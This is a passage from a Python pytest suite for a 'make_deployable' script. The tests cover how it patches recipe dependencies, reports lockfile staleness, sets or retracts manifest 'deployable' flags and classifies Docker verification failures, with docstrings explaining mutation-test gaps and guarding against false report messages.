            '"google-adk[gcp,otel-gcp]>=2.6.0,<3.0.0",',
            ",\n            ".join(f'"{s}"' for s in specs) + ",",
        ),
        encoding="utf-8",
    )


def test_no_lock_todo_when_nothing_changed_and_lock_is_current(
    recipe: Path, monkeypatch
):
    """An idempotent re-run must not claim the lockfile went stale.

    Found by running the skill twice against core/python/ambient-expense-agent:
    the second run reported `required-dependencies: clean`, wrote no file, and
    still emitted "dependencies changed and the lockfile is now stale". That
    is a false statement about the run that produced it, and acting on it
    churns uv.lock for nothing.
    """
    policy = _policy()
    _declare_all_required(recipe, policy)
    monkeypatch.setattr(md, "load_policy", lambda _root: policy)
    monkeypatch.setattr(md, "find_repo_root", lambda _p: recipe)
    # `lock_is_current` (autouse) already pins the lockfile as up to date.
    report = md.run(
        recipe_dir=recipe,
        apply=False,
        overwrite=False,
        data_dirs=[],
        region="us-east1",
    )
    deps = next(c for c in report.checks if c.id == "required-dependencies")
    assert deps.status == md.CLEAN
    assert not md.dependencies_changed(deps)
    assert not [t for t in report.todos if "uv lock" in t], (
        "nothing changed and the lockfile is current, so there is no follow-up"
    )


def test_lock_todo_survives_when_an_earlier_run_left_it_stale(
    recipe: Path, monkeypatch
):
    """Suppressing the false todo must not create a blind spot.

    Dependencies added by an EARLIER run leave this run with nothing to
    change and a stale lockfile regardless. The todo has to survive that,
    and quote uv's own reason rather than inventing one.
    """
    policy = _policy()
    _declare_all_required(recipe, policy)
    monkeypatch.setattr(md, "load_policy", lambda _root: policy)
    monkeypatch.setattr(md, "find_repo_root", lambda _p: recipe)
    monkeypatch.setattr(
        md, "lockfile_is_current", lambda _d: (False, "uv.lock is out of date.")
    )
    report = md.run(
        recipe_dir=recipe,
        apply=False,
        overwrite=False,
        data_dirs=[],
        region="us-east1",
    )
    assert not md.dependencies_changed(
        next(c for c in report.checks if c.id == "required-dependencies")
    )
    lock_todos = [t for t in report.todos if "uv lock" in t]
    assert lock_todos == [
        "Run `uv lock --python 3.11` in the recipe — uv.lock is out of date."
    ]


def test_lock_todo_fires_when_only_an_extra_was_merged(
    recipe: Path, monkeypatch
):
    """A CLEAN deps status can still mean pyproject.toml was edited.

    `patch_dependencies` merges a missing extra in place and reports CLEAN
    when nothing had to be ADDED. Gating the lock todo on status alone would
    therefore drop it for a run that really did change resolution — the
    opposite error to the one above, and the reason `dependencies_changed`
    reads `kept[].rewritten_to` as well as `added`.
    """
    policy = _policy()
    # Every required dependency present, but google-adk stripped of extras.
    _declare_all_required(recipe, policy, extras=False)
    monkeypatch.setattr(md, "load_policy", lambda _root: policy)
    monkeypatch.setattr(md, "find_repo_root", lambda _p: recipe)
    report = md.run(
        recipe_dir=recipe,
        apply=False,
        overwrite=False,
        data_dirs=[],
        region="us-east1",
    )
    deps = next(c for c in report.checks if c.id == "required-dependencies")
    assert deps.status == md.CLEAN, "nothing to ADD, so the status is CLEAN"
    assert md.dependencies_changed(deps), "but an extra was merged in place"
    assert any(
        t.startswith("Run `uv lock --python 3.11`") for t in report.todos
    )


def test_major_gate_states_both_relock_directions(tmp_path: Path):
    """The gate's conclusion was right but its stated reason was not.

    Re-locking in place KEEPS the old major (shipping serving deps against an
    ADK that cannot support them); only a fresh resolution crosses it.
    """
    write(
        tmp_path / "uv.lock",
        '[[package]]\nname = "google-adk"\nversion = "1.28.0"\n',
    )
    check = md.check_adk_locked_version(tmp_path / "uv.lock", MIN_ADK)
    assert check.status == md.NEEDS_INPUT
    assert "IN PLACE" in check.message
    assert "FRESH" in check.message


def test_stale_lock_against_a_raised_specifier_is_not_called_sticky():
    """Stickiness needs the specifier to STILL ADMIT the locked version.

    Declaring `>=2.6.0` with a 2.3.0 lock is just a stale lockfile; a plain
    `uv lock` does raise it. Telling that owner "uv lock will not raise it"
    would be as false as the claim this whole fix replaced.
    """
    import tempfile

    with tempfile.TemporaryDirectory() as d:
        lock = Path(d) / "uv.lock"
        lock.write_text(
            '[[package]]\nname = "google-adk"\nversion = "2.3.0"\n',
            encoding="utf-8",
        )
        sticky = md.check_adk_locked_version(
            lock, MIN_ADK, declared_spec="google-adk>=2.0.0,<3.0.0"
        )
        stale = md.check_adk_locked_version(
            lock, MIN_ADK, declared_spec="google-adk>=2.6.0,<3.0.0"
        )

    assert sticky.details["sticky"] is True
    assert "WILL NOT RAISE IT" in sticky.message
    assert sticky.details["remedy"] == "uv lock --upgrade-package google-adk"

    assert stale.details["sticky"] is False
    assert "WILL NOT RAISE IT" not in stale.message
    assert "merely stale" in stale.message
    assert "remedy" not in stale.details


@pytest.mark.parametrize(
    "spec,version,expected",
    [
        ("google-adk>=2.0.0,<3.0.0", "2.3.0", True),
        ("google-adk>=2.6.0,<3.0.0", "2.3.0", False),
        ("google-adk", "2.3.0", True),
        ("google-adk==2.3.0", "2.3.0", True),
        (None, "2.3.0", True),
        ("not a requirement !!", "2.3.0", True),
    ],
)
def test_spec_still_admits(spec, version, expected):
    """Unparseable or absent must default to True — the conservative answer
    sends the owner to --upgrade-package, correct in either case."""
    from packaging.version import Version

    assert md._spec_still_admits(spec, Version(version)) is expected


# ---------------------------------------------------------------------------
# Mutation-gap closers
#
# Independent review mutation-tested the suite: 47 of 60 single-point
# mutations survived with every test green. These cover the survivors whose
# escape would ship a real bug — each one was confirmed to FAIL against the
# corresponding mutation before being committed.
# ---------------------------------------------------------------------------


def test_apply_actually_writes_pyproject(recipe: Path, monkeypatch):
    """`pyproject.write_text` could be deleted outright and the suite stayed
    green — dependencies and the wheel package would silently never land."""
    monkeypatch.setattr(md, "load_policy", lambda _root: _policy())
    monkeypatch.setattr(md, "find_repo_root", lambda _p: recipe)
    before = (recipe / "pyproject.toml").read_text()
    md.run(
        recipe_dir=recipe,
        apply=True,
        overwrite=False,
        data_dirs=[],
        region="us-east1",
    )
    after = (recipe / "pyproject.toml").read_text()
    assert after != before, "pyproject.toml was never written"
    assert "a2a-sdk" in after, "required serving dependency not added"


def test_infra_axis_actually_withholds_the_flag(recipe: Path, monkeypatch):
    """Disabling the infra axis let a terraform recipe be flagged one-click
    deployable — the single worst false claim this skill can make."""
    (recipe / "terraform").mkdir()
    monkeypatch.setattr(md, "load_policy", lambda _root: _policy())
    monkeypatch.setattr(md, "find_repo_root", lambda _p: recipe)
    report = md.run(
        recipe_dir=recipe,
        apply=True,
        overwrite=False,
        data_dirs=[],
        region="us-east1",
    )
    assert report.outcome == md.OUTCOME_CONTAINERIZED_UNVERIFIED
    assert "deployable: true" not in (recipe / "manifest.yaml").read_text()


def test_adk_floor_gate_actually_stops_the_run(recipe: Path, monkeypatch):
    """The gate could be disabled entirely with the suite green."""
    pyproject = recipe / "pyproject.toml"
    pyproject.write_text(
        pyproject.read_text().replace(
            '"google-adk[gcp,otel-gcp]>=2.6.0,<3.0.0",', '"google-adk<2.0.0",'
        ),
        encoding="utf-8",
    )
    monkeypatch.setattr(md, "load_policy", lambda _root: _policy())
    monkeypatch.setattr(md, "find_repo_root", lambda _p: recipe)
    report = md.run(
        recipe_dir=recipe,
        apply=True,
        overwrite=False,
        data_dirs=[],
        region="us-east1",
    )
    assert report.outcome == md.OUTCOME_BLOCKED
    assert report.files_written == [], "a blocked gate must write nothing"
    assert not (recipe / "Dockerfile").exists()


def test_hatch_wheel_package_is_actually_added():
    """Without it `uv sync` fails inside the image. Wholly unexercised."""
    doc = tomlkit.parse(
        '[project]\nname = "d"\n\n'
        '[build-system]\nrequires = ["hatchling"]\n'
        'build-backend = "hatchling.build"\n\n'
        '[tool.hatch.build.targets.wheel]\npackages = ["other"]\n'
    )
    check = md.patch_hatch_packages(doc, "app", apply=True)
    assert check.status == md.FIXED
    packages = [
        str(x)
        for x in doc["tool"]["hatch"]["build"]["targets"]["wheel"]["packages"]
    ]
    assert "app" in packages
    assert "other" in packages, "a pre-existing entry must survive"


def test_uv_build_backend_is_reported_not_silently_patched():
    """Two recipes here use `uv_build`, which never reads the hatch table.

    Patching it there would look like a fix while leaving the package
    undeclared, so the container fails to import it at run time.
    """
    doc = tomlkit.parse(
        '[project]\nname = "d"\n\n'
        '[build-system]\nrequires = ["uv_build"]\n'
        'build-backend = "uv_build"\n'
    )
    check = md.patch_hatch_packages(doc, "app", apply=True)
    assert check.status == md.REPORT_ONLY
    assert "not hatchling" in check.message
    assert "hatch" not in str(doc.get("tool") or "")


def test_dockerignore_excludes_env_and_venv():
    """`.env` in the image is a credential leak; `.venv` shadows site-packages
    and made one recipe's build context 501 MB."""
    assert ".env" in md.DOCKERIGNORE
    assert ".venv/" in md.DOCKERIGNORE


@pytest.mark.parametrize(
    "scenario,expected_rc",
    [("clean", 0), ("gate", 1)],
)
def test_documented_exit_codes(
    recipe: Path, monkeypatch, scenario, expected_rc
):
    """0 / 1 / 2 are a documented contract for the calling agent; all three
    could be changed with the suite green."""
    if scenario == "gate":
        pyproject = recipe / "pyproject.toml"
        pyproject.write_text(
            pyproject.read_text().replace(
                '"google-adk[gcp,otel-gcp]>=2.6.0,<3.0.0",',
                '"google-adk<2.0.0",',
            ),
            encoding="utf-8",
        )
    monkeypatch.setattr(md, "load_policy", lambda _root: _policy())
    monkeypatch.setattr(md, "find_repo_root", lambda _p: recipe)
    monkeypatch.setattr(
        sys, "argv", ["make_deployable.py", "--recipe-dir", str(recipe)]
    )
    monkeypatch.setattr("builtins.print", lambda *a, **k: None)
    assert md.main() == expected_rc


def test_env_example_backing_infra_detection(tmp_path: Path):
    """The .env.example half of infra detection was wholly unexercised."""
    (tmp_path / "app").mkdir()
    write(tmp_path / ".env.example", "DATASTORE_ID=abc123\n")
    check = md.check_backing_infra(tmp_path, tmp_path / "app")
    assert check.status == md.REPORT_ONLY
    assert any("DATASTORE_ID" in r for r in check.details["reasons"])


# ---------------------------------------------------------------------------
# Guards for the fixes themselves
#
# Independent review reverted each of six fixes in a scratch copy and found
# the suite still green: the fixes were unprotected. Each test below was
# confirmed to FAIL against a full revert of the fix it names.
# ---------------------------------------------------------------------------


def test_outcome_reports_blocked_when_app_object_missing(
    recipe: Path, monkeypatch
):
    """Guards `disqualified=not app_object_ok`.

    Without it the outcome reads `deployable-unverified` — which SKILL.md
    defines as "flag is set" — while the flag is being deleted from the file.
    Asserting only on the manifest, as the other tests did, left the outcome
    free to contradict it.
    """
    (recipe / "app" / "agent.py").write_text("x = 1\n", encoding="utf-8")
    monkeypatch.setattr(md, "load_policy", lambda _root: _policy())
    monkeypatch.setattr(md, "find_repo_root", lambda _p: recipe)
    report = md.run(
        recipe_dir=recipe,
        apply=True,
        overwrite=False,
        data_dirs=[],
        region="us-east1",
    )
    assert report.outcome == md.OUTCOME_BLOCKED
    assert report.outcome != md.OUTCOME_DEPLOYABLE_UNVERIFIED


def test_deferral_outcome_is_not_a_success_string(recipe: Path, monkeypatch):
    """Guards `deferred=defer_manifest`.

    Phase one of --verify-container is ALWAYS this path, and it withholds the
    flag, so it must not report an outcome that means "flag set".
    """
    report, _ = _run_with_docker(
        recipe,
        monkeypatch,
        state=md.DOCKER_USABLE,
        lock_ok=False,
        verified=True,
    )
    assert report.outcome == md.OUTCOME_BLOCKED
    assert "deployable: true" not in (recipe / "manifest.yaml").read_text()


def test_arm64_run_failure_is_environmental_not_a_verdict(
    tmp_path: Path, monkeypatch
):
    """Cross-architecture failure is handled where docker itself reports it.

    An earlier attempt refused to verify at all on any non-amd64 host. That
    was a false skip — Docker Desktop bundles QEMU, so Apple Silicon builds
    amd64 fine — and it claimed "no manifest flag was changed" in a run that
    then set the flag. Removed in favour of classifying the `docker run`
    failure, whose text is docker's OWN output.
    """
    fake = FakeDocker({"run": (125, "", "exec /bin/sh: exec format error")})
    monkeypatch.setattr(md, "_docker", fake)
    report = md.Report(recipe_dir=str(tmp_path), mode="apply")
    result = md.verify_container(
        recipe_dir=tmp_path,
        package="app",
        settings=SETTINGS,
        may_run=True,
        report=report,
    )
    assert result is None, "a platform mismatch is the host's fault"


def test_shebangless_recipe_script_is_still_a_verdict(
    tmp_path: Path, monkeypatch
):
    """Same errno, different fault. A recipe shipping a script with no
    shebang must not be excused as environmental."""
    fake = FakeDocker(
        {"run": (125, "", "exec /app/start.sh: exec format error")}
    )
    monkeypatch.setattr(md, "_docker", fake)
    report = md.Report(recipe_dir=str(tmp_path), mode="apply")
    result = md.verify_container(
        recipe_dir=tmp_path,
        package="app",
        settings=SETTINGS,
        may_run=True,
        report=report,
    )
    assert result is False, "the recipe's own broken script is a verdict"


@pytest.mark.parametrize(
    "crash_log",
    [
        "ConnectionResetError: [Errno 104] Connection reset by peer",
        "httpx.ReadTimeout: Request timed out after 60s",
        "grpc: context deadline exceeded",
        "OSError: No space left on device",
    ],
)
def test_recipe_crash_mentioning_infra_words_is_still_a_verdict(
    tmp_path: Path, monkeypatch, crash_log
):
    """The laundering bug, pinned.

    A container that EXITED is broken. Nothing it printed on the way down may
    convert that into a pass — those phrases occur constantly in real
    application tracebacks.
    """
    fake = FakeDocker(
        {
            "port": (0, "127.0.0.1:54321\n", ""),
            "inspect": (0, "false\n", ""),
            "logs": (0, crash_log, ""),
        }
    )
    monkeypatch.setattr(md, "_docker", fake)
    monkeypatch.setattr(md, "_probe", lambda url, timeout=10: (0, "refused"))
    report = md.Report(recipe_dir=str(tmp_path), mode="apply")

    result = md.verify_container(
        recipe_dir=tmp_path,
        package="app",
        settings={**SETTINGS, "ready_timeout_seconds": 1},
        may_run=True,
        report=report,
    )

    assert result is False, f"a crash logging {crash_log!r} is still a crash"
    serves = next(c for c in report.checks if c.id == "container-serves")
    assert serves.status == md.ERROR


def test_genuine_crash_on_exit_is_still_a_verdict(tmp_path: Path, monkeypatch):
    """The environmental carve-out must not swallow a real crash."""
    fake = FakeDocker(
        {
            "port": (0, "127.0.0.1:54321\n", ""),
            "inspect": (0, "false\n", ""),
            "logs": (0, "ModuleNotFoundError: No module named 'app'\n", ""),
        }
    )
    monkeypatch.setattr(md, "_docker", fake)
    monkeypatch.setattr(md, "_probe", lambda url, timeout=10: (0, "refused"))
    report = md.Report(recipe_dir=str(tmp_path), mode="apply")
    result = md.verify_container(
        recipe_dir=tmp_path,
        package="app",
        settings={**SETTINGS, "ready_timeout_seconds": 1},
        may_run=True,
        report=report,
    )
    assert result is False


def test_infra_branch_reports_a_pre_existing_flag(tmp_path: Path):
    """Guards the read added to the infra branch.

    Two recipes here already ship `deployable: true`; asserting "left unset"
    about them is a claim the reader can falsify by opening the file.
    """
    m = tmp_path / "manifest.yaml"
    m.write_text("type: agent\ndeployable: True\n", encoding="utf-8")
    check = md.patch_manifest_deployable(m, infra_clean=False, apply=True)
    assert check.details.get("pre_existing_flag") is True
    assert "ALREADY says" in check.message
    # Case variants must agree with the ruamel path used elsewhere.
    m.write_text("type: agent\ndeployable: TRUE\n", encoding="utf-8")
    assert (
        md.patch_manifest_deployable(
            m, infra_clean=False, apply=True
        ).details.get("pre_existing_flag")
        is True
    )


def test_acli_manifest_is_recorded_in_files_written(recipe: Path, monkeypatch):
    """Guards the `report=` wiring. Seven files landed, six were reported."""
    monkeypatch.setattr(md, "load_policy", lambda _root: _policy())
    monkeypatch.setattr(md, "find_repo_root", lambda _p: recipe)
    report = md.run(
        recipe_dir=recipe,
        apply=True,
        overwrite=False,
        data_dirs=[],
        region="us-east1",
    )
    assert (recipe / "agents-cli-manifest.yaml").is_file()
    assert "agents-cli-manifest.yaml" in report.files_written
    # Exactly once, and every reported file must actually exist.
    assert report.files_written.count("agents-cli-manifest.yaml") == 1
    for rel in report.files_written:
        assert (recipe / rel).exists(), f"{rel} reported but absent"


def test_bespoke_entrypoint_still_warns_on_the_second_run(
    recipe: Path, monkeypatch
):
    """Guards `generated_by_us` against being decided by the Dockerfile alone.

    A recipe with a bespoke entrypoint and no Dockerfile got the advisory on
    run 1 and lost it on run 2 — and run 2 is mandatory in the two-phase flow.
    """
    monkeypatch.setattr(md, "load_policy", lambda _root: _policy())
    monkeypatch.setattr(md, "find_repo_root", lambda _p: recipe)
    (recipe / "app" / "fast_api_app.py").write_text(
        "# bespoke 400-line entrypoint\napp = object()\n", encoding="utf-8"
    )
    md.run(
        recipe_dir=recipe,
        apply=True,
        overwrite=False,
        data_dirs=[],
        region="us-east1",
    )
    second = md.run(
        recipe_dir=recipe,
        apply=True,
        overwrite=False,
        data_dirs=[],
        region="us-east1",
    )
    advisory = next(c for c in second.checks if c.id == "already-deployable")
    assert advisory.status == md.REPORT_ONLY, (
        "the bespoke entrypoint is still the contributor's; the dead-code "
        "advisory must not be suppressed"
    )


def test_declared_spec_is_actually_wired_through(recipe: Path, monkeypatch):
    """Guards `declared_spec=declared_adk` in run().

    The helper was tested directly, so dropping the wiring changed nothing.
    """
    pyproject = recipe / "pyproject.toml"
    pyproject.write_text(
        pyproject.read_text().replace(
            '"google-adk[gcp,otel-gcp]>=2.6.0,<3.0.0",',
            '"google-adk[gcp,otel-gcp]>=2.0.0,<3.0.0",',
        ),
        encoding="utf-8",
    )
    (recipe / "uv.lock").write_text(
        '[[package]]\nname = "google-adk"\nversion = "2.3.0"\n',
        encoding="utf-8",
    )
    monkeypatch.setattr(md, "load_policy", lambda _root: _policy())
    monkeypatch.setattr(md, "find_repo_root", lambda _p: recipe)
    report = md.run(
        recipe_dir=recipe,
        apply=False,
        overwrite=False,
        data_dirs=[],
        region="us-east1",
    )
    locked = next(c for c in report.checks if c.id == "adk-locked-version")
    assert locked.details.get("sticky") is True, (
        "declared_spec was not passed through, so stickiness was misjudged"
    )


# ---------------------------------------------------------------------------
# _manifest_claims_deployable — the negative cases
#
# Review mutation-tested this helper: loosening the regex to match any
# `deployable:` line, or to accept yes/on, or to match indented keys, or
# replacing the body with `return True`, ALL survived with the suite green.
# The positives alone pinned nothing.
# ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    "line,expected",
    [
        ("deployable: true", True),
        ("deployable: True", True),
        ("deployable: TRUE", True),
        ("deployable: true  # one-command deploy", True),
        ("deployable:\ttrue", True),
        # Negatives — each one a mutation that previously survived.
        ("deployable: false", False),
        ("deployable: False", False),
        # ruamel (YAML 1.2) parses these as STRINGS, not booleans, so treating
        # them as a claim would disagree with the parse used elsewhere.
        ("deployable: yes", False),
        ("deployable: on", False),
        # Nested under another key is a different key entirely.
        ("  deployable: true", False),
        ("# deployable: true", False),
        ("deployable_at: true", False),
    ],
)
def test_manifest_claims_deployable_positives_and_negatives(
    tmp_path: Path, line, expected
):
    m = tmp_path / "manifest.yaml"
    m.write_text(f"type: agent\n{line}\n", encoding="utf-8")
    assert md._manifest_claims_deployable(m) is expected


def test_manifest_claims_deployable_agrees_with_ruamel_on_real_manifests():
    """The helper exists to stop two readers disagreeing. Prove they don't."""
    from ruamel.yaml import YAML

    yaml = YAML(typ="safe")
    repo_root = Path(__file__).resolve().parents[4]
    checked = 0
    for manifest in sorted(
        list((repo_root / "core" / "python").glob("*/manifest.yaml"))
        + list((repo_root / "contrib" / "python").glob("*/manifest.yaml"))
    ):
        with open(manifest, encoding="utf-8") as f:
            data = yaml.load(f) or {}
        assert md._manifest_claims_deployable(manifest) is (
            data.get("deployable") is True
        ), f"readers disagree on {manifest}"
        checked += 1
    assert checked >= 10, f"expected the repo's manifests, scanned {checked}"


def test_missing_app_object_retracts_without_any_error_check(
    recipe: Path, monkeypatch
):
    """Documents the flag column of the `blocked` row.

    A reader trusting "blocked + no ERROR means the tree was untouched" would
    miss this deletion: the app-object path retracts with no ERROR present.
    """
    (recipe / "manifest.yaml").write_text(
        "type: standalone\nlanguage: python\ndeployable: true\n",
        encoding="utf-8",
    )
    (recipe / "app" / "agent.py").write_text("x = 1\n", encoding="utf-8")
    monkeypatch.setattr(md, "load_policy", lambda _root: _policy())
    monkeypatch.setattr(md, "find_repo_root", lambda _p: recipe)
    report = md.run(
        recipe_dir=recipe,
        apply=True,
        overwrite=False,
        data_dirs=[],
        region="us-east1",
    )
    assert report.outcome == md.OUTCOME_BLOCKED
    assert not md._has_error(report), "no ERROR, yet the flag is retracted"
    assert "deployable: true" not in (recipe / "manifest.yaml").read_text()


# ---------------------------------------------------------------------------
# Pass-5: the platform/verdict boundary, and the mutants that survived
# ---------------------------------------------------------------------------


def test_runtime_exec_failure_does_not_retract_the_flag(
    tmp_path: Path, monkeypatch
):
    """The arm64 case that actually happens: `docker run -d` SUCCEEDS and the
    container then dies because the runtime cannot exec the binary.

    Nothing consulted that path, so a contributor's flag was deleted because
    our host lacked binfmt.
    """
    fake = FakeDocker(
        {
            "port": (0, "127.0.0.1:54321\n", ""),
            "inspect": (0, "false\n", ""),
            "logs": (0, "exec /usr/local/bin/uv: exec format error\n", ""),
        }
    )
    monkeypatch.setattr(md, "_docker", fake)
    monkeypatch.setattr(md, "_probe", lambda url, timeout=10: (0, "refused"))
    report = md.Report(recipe_dir=str(tmp_path), mode="apply")

    result = md.verify_container(
        recipe_dir=tmp_path,
        package="app",
        settings={**SETTINGS, "ready_timeout_seconds": 1},
        may_run=True,
        report=report,
    )

    assert result is None, "the runtime refusing to exec is the host's fault"
    serves = next(c for c in report.checks if c.id == "container-serves")
    assert serves.details["platform_failure"] is True
    assert serves.status == md.REPORT_ONLY


@pytest.mark.parametrize(
    "log",
    [
        # An app printing the phrase mid-traceback is NOT the runtime refusing
        # to exec — this is the laundering bug's last hiding place.
        "Traceback...\nRuntimeError: exec /usr/local/bin/uv: exec format error",
        "ConnectionResetError: [Errno 104] Connection reset by peer",
        "ModuleNotFoundError: No module named 'app'",
        "",
    ],
)
def test_only_a_whole_line_runtime_error_counts(log):
    assert md.runtime_platform_failure(log) is False


def test_whole_line_runtime_error_is_recognised():
    assert md.runtime_platform_failure(
        "exec /usr/local/bin/uv: exec format error"
    )
    assert md.runtime_platform_failure("  exec /bin/sh: exec format error  \n")


def test_inconclusive_is_distinguishable_from_never_tried(
    recipe: Path, monkeypatch
):
    """Guards OUTCOME_VERIFICATION_INCONCLUSIVE.

    "go find docker" and "retry, the network defeated you" are opposite
    instructions, and they used to share one outcome string.
    """
    monkeypatch.setattr(md, "load_policy", lambda _root: _policy())
    monkeypatch.setattr(md, "find_repo_root", lambda _p: recipe)
    monkeypatch.setattr(
        md, "detect_docker", lambda: (md.DOCKER_USABLE, "stubbed")
    )
    monkeypatch.setattr(
        md, "lockfile_is_current", lambda *a, **k: (True, "stubbed")
    )

    def env_failure(**kwargs):
        kwargs["report"].add(
            md.Check(
                id="container-build",
                status=md.REPORT_ONLY,
                message="dns died",
                details={"environmental": True},
            )
        )

    monkeypatch.setattr(md, "verify_container", env_failure)
    attempted = md.run(
        recipe_dir=recipe,
        apply=True,
        overwrite=False,
        data_dirs=[],
        region="us-east1",
        verify_container_requested=True,
    )
    assert attempted.outcome == md.OUTCOME_VERIFICATION_INCONCLUSIVE

    # Never tried is a different string.
    monkeypatch.setattr(
        md, "detect_docker", lambda: (md.DOCKER_ABSENT, "stubbed")
    )
    never = md.run(
        recipe_dir=recipe,
        apply=True,
        overwrite=False,
        data_dirs=[],
        region="us-east1",
    )
    assert never.outcome == md.OUTCOME_DEPLOYABLE_UNVERIFIED
    assert never.outcome != attempted.outcome


def test_deferral_discloses_a_concurrent_disqualification(
    recipe: Path, monkeypatch
):
    """`container-verify` is the documented way to spot a deferral, so it must
    not say "held back" when the flag was actually deleted."""
    (recipe / "manifest.yaml").write_text(
        "type: standalone\nlanguage: python\ndeployable: true\n",
        encoding="utf-8",
    )
    (recipe / "app" / "agent.py").write_text("x = 1\n", encoding="utf-8")
    report, _ = _run_with_docker(
        recipe,
        monkeypatch,
        state=md.DOCKER_USABLE,
        lock_ok=False,
        verified=True,
    )
    verify = next(c for c in report.checks if c.id == "container-verify")
    assert verify.details["also_disqualified"] is True
    assert "RETRACTED" in verify.message
    assert "deployable: true" not in (recipe / "manifest.yaml").read_text()


def test_inconclusive_messages_do_not_claim_the_manifest_was_untouched(
    tmp_path: Path, monkeypatch
):
    """An inconclusive run still lets static checks earn the flag, so no
    message may claim "no manifest flag was changed"."""
    fake = FakeDocker(
        {"build": (1, "", "Temporary failure in name resolution")}
    )
    monkeypatch.setattr(md, "_docker", fake)
    report = md.Report(recipe_dir=str(tmp_path), mode="apply")
    md.verify_container(
        recipe_dir=tmp_path,
        package="app",
        settings=SETTINGS,
        may_run=True,
        report=report,
    )
    build = next(c for c in report.checks if c.id == "container-build")
    assert "no manifest flag was changed" not in build.message
    assert "nothing was RETRACTED" in build.message


def test_backing_infra_message_does_not_overclaim(tmp_path: Path):
    """Guards the reworded message (mutant M7 survived)."""
    (tmp_path / "app").mkdir()
    (tmp_path / "terraform").mkdir()
    check = md.check_backing_infra(tmp_path, tmp_path / "app")
    assert "will not SET" in check.message
    assert "is left unset" not in check.message


def test_failed_to_create_endpoint_is_environmental():
    """Guards a pattern whose deletion survived mutation (M3)."""
    proc = subprocess.CompletedProcess(
        args=[],
        returncode=1,
        stdout="",
        stderr="failed to create endpoint adk-verify on network bridge",
    )
    assert md.failure_is_environmental(proc) is True


# ---------------------------------------------------------------------------
# Pass-6: the inconclusive escape hatch must not mask a disqualification
#
# Every mutation below survived with 179 tests green before these were added.
# ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    "kwargs",
    [
        {"has_error": True},
        {"skill_fault": True},
        {"disqualified": True},
    ],
)
def test_inconclusive_never_outranks_a_disqualification(kwargs):
    """A network hiccup must not relabel a run that RETRACTED the flag.

    Verification is not gated on the static checks, so a disqualified recipe
    still gets built. Without this precedence, any environmental failure
    during that build reported `verification-inconclusive` — documented as
    "nothing is retracted" — for a run that had just deleted the flag.
    """
    assert (
        md.outcome_for(
            infra_clean=True, verified=None, inconclusive=True, **kwargs
        )
        == md.OUTCOME_BLOCKED
    )


def test_inconclusive_applies_when_nothing_else_disqualifies():
    assert (
        md.outcome_for(infra_clean=True, verified=None, inconclusive=True)
        == md.OUTCOME_VERIFICATION_INCONCLUSIVE
    )


def test_proven_failure_still_outranks_inconclusive():
    assert (
        md.outcome_for(infra_clean=True, verified=False, inconclusive=True)
        == md.OUTCOME_VERIFICATION_FAILED
    )


def test_inconclusive_outcome_string_is_the_documented_one():
    """SKILL.md names this literal; changing it silently broke nothing."""
    assert md.OUTCOME_VERIFICATION_INCONCLUSIVE == "verification-inconclusive"
    assert md.OUTCOME_VERIFICATION_INCONCLUSIVE not in (
        md.OUTCOME_CONTAINERIZED_UNVERIFIED,
        md.OUTCOME_DEPLOYABLE_UNVERIFIED,
    )


def test_disqualified_recipe_with_env_failure_reports_blocked_end_to_end(
    recipe: Path, monkeypatch
):
    """The full path the unit test above abstracts."""
    (recipe / "manifest.yaml").write_text(
        "type: standalone\nlanguage: python\ndeployable: true\n",
        encoding="utf-8",
    )
    (recipe / "app" / "agent.py").write_text("x = 1\n", encoding="utf-8")
    monkeypatch.setattr(md, "load_policy", lambda _root: _policy())
    monkeypatch.setattr(md, "find_repo_root", lambda _p: recipe)
    monkeypatch.setattr(
        md, "detect_docker", lambda: (md.DOCKER_USABLE, "stubbed")
    )
    monkeypatch.setattr(
        md, "lockfile_is_current", lambda *a, **k: (True, "stubbed")
    )

    def env_failure(**kwargs):
        kwargs["report"].add(
            md.Check(
                id="container-build",
                status=md.REPORT_ONLY,
                message="dns died",
                details={"environmental": True},
            )
        )

    monkeypatch.setattr(md, "verify_container", env_failure)
    report = md.run(
        recipe_dir=recipe,
        apply=True,
        overwrite=False,
        data_dirs=[],
        region="us-east1",
        verify_container_requested=True,
    )
    # The flag WAS retracted, so the outcome must not claim otherwise.
    assert "deployable: true" not in (recipe / "manifest.yaml").read_text()
    assert report.outcome == md.OUTCOME_BLOCKED


def test_platform_failure_counts_as_an_attempt_for_the_closing_note(
    recipe: Path, monkeypatch
):
    """The arm64 path set no `environmental` detail, so the note told the
    owner "nobody has yet built the image" about a run that built one."""
    monkeypatch.setattr(md, "load_policy", lambda _root: _policy())
    monkeypatch.setattr(md, "find_repo_root", lambda _p: recipe)
    monkeypatch.setattr(
        md, "detect_docker", lambda: (md.DOCKER_USABLE, "stubbed")
    )
    monkeypatch.setattr(
        md, "lockfile_is_current", lambda *a, **k: (True, "stubbed")
    )

    def platform_failure(**kwargs):
        kwargs["report"].add(
            md.Check(
                id="container-serves",
                status=md.REPORT_ONLY,
                message="runtime could not exec the image's binary",
                details={"platform_failure": True},
            )
        )

    monkeypatch.setattr(md, "verify_container", platform_failure)
    report = md.run(
        recipe_dir=recipe,
        apply=True,
        overwrite=False,
        data_dirs=[],
        region="us-east1",
        verify_container_requested=True,
    )
    joined = " ".join(report.notes)
    assert "nobody has yet built the image" not in joined
    assert "verification-inconclusive" in joined
    assert report.outcome == md.OUTCOME_VERIFICATION_INCONCLUSIVE


def test_runtime_exec_signature_must_be_the_only_output(tmp_path: Path):
    """Guards the `and exited` + sole-line hardening.

    The justification is that NO application code ran. A log carrying app
    output as well contradicts that, and would let a crash that happens to
    echo a subprocess's exec error escape its verdict.
    """
    assert md.runtime_platform_failure(
        "exec /usr/local/bin/uv: exec format error"
    )
    assert not md.runtime_platform_failure(
        "RuntimeError: could not start the scanner sidecar\n"
        "exec /opt/tools/scanner: exec format error"
    )


def test_exited_guard_is_required_for_platform_failure(
    tmp_path: Path, monkeypatch
):
    """A RUNNING container must never be excused by log text, whatever it says."""
    fake = FakeDocker(
        {
            "port": (0, "127.0.0.1:54321\n", ""),
            "inspect": (0, "true\n", ""),  # still running
            "logs": (0, "exec /usr/local/bin/uv: exec format error\n", ""),
        }
    )
    monkeypatch.setattr(md, "_docker", fake)
    monkeypatch.setattr(md, "_probe", lambda url, timeout=10: (404, "nope"))
    report = md.Report(recipe_dir=str(tmp_path), mode="apply")
    result = md.verify_container(
        recipe_dir=tmp_path,
        package="app",
        settings={**SETTINGS, "ready_timeout_seconds": 1},
        may_run=True,
        report=report,
    )
    # Answered 404 for the whole window while alive: that is a verdict.
